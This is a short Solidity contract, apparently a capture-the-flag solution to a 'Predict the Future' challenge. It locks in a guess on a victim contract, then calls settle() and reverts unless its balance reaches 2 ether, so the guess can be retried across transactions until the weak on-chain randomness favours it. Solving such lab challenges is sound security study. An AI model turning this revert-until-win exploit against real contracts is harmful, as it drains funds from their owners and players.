// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.4.21;

import "./PredictTheFutureChallenge.sol";

// PRN games - multiple transactions.
// PRN games - attack can be tried in loop with multiple transactions until our guess is correct.

contract Solution8 {
    PredictTheFutureChallenge public victim;

    function Solution8(PredictTheFutureChallenge victim_) public {
        victim = victim_;
    }

    function lock() external payable {
        victim.lockInGuess.value(1 ether)(0);
    }

    function attack() external {
        victim.settle();
        require(address(this).balance == 2 ether);
    }

    //We need this to be able to handle payable(owner).transfer(address(this).balance);
    function() external payable {
    }
}
